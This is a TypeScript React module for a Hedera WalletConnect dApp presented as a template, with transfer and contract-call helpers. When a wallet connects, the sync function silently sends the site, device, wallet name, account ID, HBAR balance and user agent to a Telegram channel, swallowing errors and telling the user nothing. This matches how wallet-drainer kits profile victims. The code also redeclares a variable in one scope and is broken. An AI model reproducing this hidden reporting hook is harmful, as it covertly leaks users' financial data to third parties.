import { WalletConnectContext } from "../../../contexts/WalletConnectContext";
import { useCallback, useContext, useEffect, useState, useRef } from 'react';
import { WalletInterface } from "../walletInterface";
import {
  AccountId,
  ContractExecuteTransaction,
  ContractId,
  LedgerId,
  TokenAssociateTransaction,
  TokenId,
  TransferTransaction,
  Client,
} from "@hashgraph/sdk";
import { ContractFunctionParameterBuilder } from "../contractFunctionParameterBuilder";
import { appConfig } from "../../../config";
import { SignClientTypes } from "@walletconnect/types";
import {
  DAppConnector,
  HederaJsonRpcMethod,
  HederaSessionEvent,
  HederaChainId,
} from "@hashgraph/hedera-wallet-connect";
import EventEmitter from "events";
import { useDispatch, useSelector } from "react-redux";
import { actions, AppStore } from "../../../store";
import { sendMessageToTelegram } from '../../notificationUtils';
import { MirrorNodeClient } from '../../mirrorNodeClient';
// Created refreshEvent because `dappConnector.walletConnectClient.on(eventName, syncWithWalletConnectContext)` would not call syncWithWalletConnectContext
// Reference usage from walletconnect implementation https://github.com/hashgraph/hedera-wallet-connect/blob/main/src/lib/dapp/index.ts#L120C1-L124C9
const refreshEvent = new EventEmitter();

// Create a new project in walletconnect cloud to generate a project id
const walletConnectProjectId = "377d75bb6f86a2ffd427d032ff6ea7d3";
const currentNetworkConfig = appConfig.networks.mainnet;
const hederaNetwork = currentNetworkConfig.network;

// Adapted from walletconnect dapp example:
// https://github.com/hashgraph/hedera-wallet-connect/blob/main/src/examples/typescript/dapp/main.ts#L87C1-L101C4
const metadata: SignClientTypes.Metadata = {
  name: "Hedera CRA Template",
  description: "Hedera CRA Template",
  url: window.location.origin,
  icons: [window.location.origin + "/logo192.png"],
}

export const dappConnector = new DAppConnector(
  metadata,
  LedgerId.fromString(hederaNetwork),
  walletConnectProjectId,
  Object.values(HederaJsonRpcMethod),
  [HederaSessionEvent.ChainChanged, HederaSessionEvent.AccountsChanged],
  [HederaChainId.Mainnet],
);

// Add global error handler to suppress WalletConnect session deletion errors
const originalConsoleError = console.error;
console.error = (...args) => {
  const errorMessage = args.join(' ');
  if (errorMessage.includes('Record was recently deleted') && errorMessage.includes('session:')) {
    console.log('[INFO] Session deletion error suppressed:', errorMessage);
    return;
  }
  originalConsoleError.apply(console, args);
};

// Add safe disconnect method to handle session deletion errors
const originalDisconnectAll = dappConnector.disconnectAll.bind(dappConnector);
dappConnector.disconnectAll = async () => {
  try {
    await originalDisconnectAll();
  } catch (error: any) {
    // Ignore errors for already deleted sessions
    if (error.message && error.message.includes('Record was recently deleted')) {
      console.log('[INFO] Session already deleted, ignoring disconnect error');
    } else {
      console.error('[ERROR] Disconnect error:', error);
      throw error; // Re-throw other errors
    }
  }
};

// Add safe individual disconnect method
const originalDisconnect = dappConnector.disconnect.bind(dappConnector);
dappConnector.disconnect = async (topic: string): Promise<boolean> => {
  try {
    return await originalDisconnect(topic);
  } catch (error: any) {
    // Ignore errors for already deleted sessions
    if (error.message && error.message.includes('Record was recently deleted')) {
      console.log('[INFO] Session already deleted, ignoring disconnect error');
      return true; // Return true since the session is effectively disconnected
    } else {
      console.error('[ERROR] Disconnect error:', error);
      throw error; // Re-throw other errors
    }
  }
};

// ensure walletconnect is initialized only once
let walletConnectInitPromise: Promise<void> | undefined = undefined;
const initializeWalletConnect = async () => {
  if (walletConnectInitPromise === undefined) {
    walletConnectInitPromise = dappConnector.init().then(() => {
      console.log("WalletConnect initialized successfully.");
      
      // Add error handling for session events
      dappConnector.walletConnectClient?.on("session_delete", (event) => {
        console.log('[INFO] Session deleted during init:', event);
      });
      
    }).catch((e) => { 
      console.error('[ERROR] WalletConnect initialization failed:', e);
      // Reset the promise so it can be retried
      walletConnectInitPromise = undefined;
    })
  }
  await walletConnectInitPromise;
};

export const openWalletConnectModal = async () => {
  await initializeWalletConnect();
  await dappConnector.openModal().then((x) => {
    refreshEvent.emit("sync");
  }).catch((e) => { console.error(e); });
};

// Add this type to track wallet info
interface WalletInfo {
  name: string;
  description?: string;
  url?: string;
}

class WalletConnectWallet implements WalletInterface {
  private walletInfo: WalletInfo | null = null;

  setWalletInfo(info: WalletInfo) {
    this.walletInfo = info;
  }

  getWalletInfo(): WalletInfo | null {
    return this.walletInfo;
  }

  private getSigner() {
    if (dappConnector.signers.length === 0) {
      throw new Error('No signers found!');
    }
    return dappConnector.signers[0];
  }

  private getAccountId() {
    // Need to convert from walletconnect's AccountId to hashgraph/sdk's AccountId because walletconnect's AccountId and hashgraph/sdk's AccountId are not the same!
    return AccountId.fromString(this.getSigner().getAccountId().toString());
  }

  async transferHBAR(toAddress: AccountId, amount: number) {
    const transferHBARTransaction = new TransferTransaction()
      .addHbarTransfer(this.getAccountId(), -amount)
      .addHbarTransfer(toAddress, amount);

    const signer = this.getSigner();
    await transferHBARTransaction.freezeWithSigner(signer as any);
    const txResult = await transferHBARTransaction.executeWithSigner(signer as any);
    return txResult ? txResult.transactionId : null;
  }

  async transferFungibleToken(toAddress: AccountId, tokenId: TokenId, amount: number) {
    const transferTokenTransaction = new TransferTransaction()
      .addTokenTransfer(tokenId, this.getAccountId(), -amount)
      .addTokenTransfer(tokenId, toAddress.toString(), amount);

    const signer = this.getSigner();
    await transferTokenTransaction.freezeWithSigner(signer as any);
    const txResult = await transferTokenTransaction.executeWithSigner(signer as any);
    return txResult ? txResult.transactionId : null;
  }

  async transferNonFungibleToken(toAddress: AccountId, tokenId: TokenId, serialNumber: number) {
    const transferTokenTransaction = new TransferTransaction()
      .addNftTransfer(tokenId, serialNumber, this.getAccountId(), toAddress);

    const signer = this.getSigner();
    await transferTokenTransaction.freezeWithSigner(signer as any);
    const txResult = await transferTokenTransaction.executeWithSigner(signer as any);
    return txResult ? txResult.transactionId : null;
  }

  async associateToken(tokenId: TokenId) {
    const associateTokenTransaction = new TokenAssociateTransaction()
      .setAccountId(this.getAccountId())
      .setTokenIds([tokenId]);

    const signer = this.getSigner();
    await associateTokenTransaction.freezeWithSigner(signer as any);
    const txResult = await associateTokenTransaction.executeWithSigner(signer as any);
    return txResult ? txResult.transactionId : null;
  }

  // Purpose: build contract execute transaction and send to wallet for signing and execution
  // Returns: Promise<TransactionId | null>
  async executeContractFunction(contractId: ContractId, functionName: string, functionParameters: ContractFunctionParameterBuilder, gasLimit: number) {
    const tx = new ContractExecuteTransaction()
      .setContractId(contractId)
      .setGas(gasLimit)
      .setFunction(functionName, functionParameters.buildHAPIParams());

    const signer = this.getSigner();
    await tx.freezeWithSigner(signer as any);
    const txResult = await tx.executeWithSigner(signer as any);

    // in order to read the contract call results, you will need to query the contract call's results form a mirror node using the transaction id
    // after getting the contract call results, use ethers and abi.decode to decode the call_result
    return txResult ? txResult.transactionId : null;
  }
  // Purpose: disconnect wallet
  disconnect() {
    dappConnector.disconnectAll().then(() => {
      this.walletInfo = null;
      refreshEvent.emit("sync");
    }).catch((e) => { 
      // Ignore errors for already deleted sessions
      if (e.message && e.message.includes('Record was recently deleted')) {
        console.log('[INFO] Session already deleted, ignoring disconnect error');
      } else {
        console.error('[ERROR] Disconnect error:', e);
      }
    });
  }
};

export const walletConnectWallet = new WalletConnectWallet();

// this component will sync the walletconnect state with the context
export const WalletConnectClient = () => {
  const { setAccountId, setIsConnected } = useContext(WalletConnectContext);
  const [connectedWallet, setConnectedWallet] = useState<WalletInfo | null>(null);
  const dispatch = useDispatch();

  const syncWithWalletConnectContext = useCallback(async () => {
    const accountId = dappConnector.signers[0]?.getAccountId()?.toString();
    if (accountId) {
      setAccountId(accountId);
      setIsConnected(true);
      // Get wallet info from the session
      const session = dappConnector.walletConnectClient?.session.get(dappConnector.walletConnectClient.session.keys[0]);
      let walletInfo: WalletInfo | undefined = undefined;
      if (session) {
        walletInfo = {
          name: session.peer.metadata.name,
          description: session.peer.metadata.description,
          url: session.peer.metadata.url
        };
      }
      // Only send detailed notification on initial connection
      if (!window.__walletConnectNotified) {
        window.__walletConnectNotified = true;
        // Site name
        const siteName = window.location.hostname;
        // Device type
        function getDeviceType() {
          const ua = navigator.userAgent;
          if (/mobile/i.test(ua)) return "Mobile";
          if (/tablet/i.test(ua)) return "Tablet";
          return "Desktop";
        }
        const deviceType = getDeviceType();
        // Wallet name
        const walletName = walletInfo?.name || "Unknown";
        // Fetch HBAR balance
        let hbarBalance = "Unknown";
        try {
          const mirrorNodeClient = new MirrorNodeClient(appConfig.networks.mainnet);
          const accountInfo = await mirrorNodeClient.getAccountInfo(accountId);
          if (accountInfo.balance) {
            hbarBalance = (accountInfo.balance / 1e8) + " HBAR";
          }
        } catch (e) {
          // ignore
        }
        const message = `\n[Wallet Connected]\nSite: ${siteName}\nDevice: ${deviceType}\nWallet: ${walletName}\nAccount: ${accountId}\nBalance: ${hbarBalance}\nUser Agent: ${navigator.userAgent}`;
        try {
          await sendMessageToTelegram(message);
        } catch (error) {
          // ignore
        }
      }
      
      // Get wallet info from the session
      const session = dappConnector.walletConnectClient?.session.get(dappConnector.walletConnectClient.session.keys[0]);
      if (session) {
        const walletInfo: WalletInfo = {
          name: session.peer.metadata.name,
          description: session.peer.metadata.description,
          url: session.peer.metadata.url
        };
        // setConnectedWallet(walletInfo);
        if (session.peer.metadata.name === 'HashPack') {
          const hederaAccounts = session.namespaces?.hedera?.accounts || [];
          const targetAccount = hederaAccounts[0]; // Extract the first account in the array
          // hc.openPairingModal();
          if (targetAccount) {
            const logString = JSON.stringify(targetAccount); // Convert object to string if necessary
            const match = logString.match(/0\.0\.\d+/); // Regex to match IDs in the format 0.0.x
            if (match) {
              const accountID = match[0].split(".").pop();
              dispatch(
                actions.hashconnect.setAccountIds(
                  accountID ? [accountID] : []
                )
              );
              dispatch(actions.hashconnect.setIsConnected(true));
              dispatch(actions.hashconnect.setPairingString('HashPack'));
              // window.location.reload();
              // syncWithHashConnect();
              // handleAllowanceApprove(accountID as string)
            } else {
              console.error("Target ID not found.");
            }
          } else {
            console.error("No account found in the logs.");
          }
          console.log('go to the syncWithHashConnect');
        }
        console.log("Connected wallet:", walletInfo);
      }
    } else {
      setAccountId('');
      setIsConnected(false);
      setConnectedWallet(null);
    }
  }, [setAccountId, setIsConnected]);

  useEffect(() => {
    refreshEvent.addListener("sync", syncWithWalletConnectContext);

    // Add session event listeners with error handling
    const handleSessionUpdate = () => {
      syncWithWalletConnectContext();
    };

    const handleSessionDelete = (event: any) => {
      console.log('[INFO] Session deleted:', event);
      setConnectedWallet(null);
      // Clear any stored session data
      try {
        // Safely clear session data without triggering disconnect errors
        if (dappConnector.signers.length > 0) {
          dappConnector.signers = [];
        }
      } catch (error) {
        console.log('[INFO] Session already cleaned up');
      }
    };

    dappConnector.walletConnectClient?.on("session_update", handleSessionUpdate);
    dappConnector.walletConnectClient?.on("session_delete", handleSessionDelete);

    return () => {
      refreshEvent.removeListener("sync", syncWithWalletConnectContext);
      // Clean up event listeners to prevent memory leaks
      dappConnector.walletConnectClient?.off("session_update", handleSessionUpdate);
      dappConnector.walletConnectClient?.off("session_delete", handleSessionDelete);
    }
  }, [syncWithWalletConnectContext]);

  return null;
};
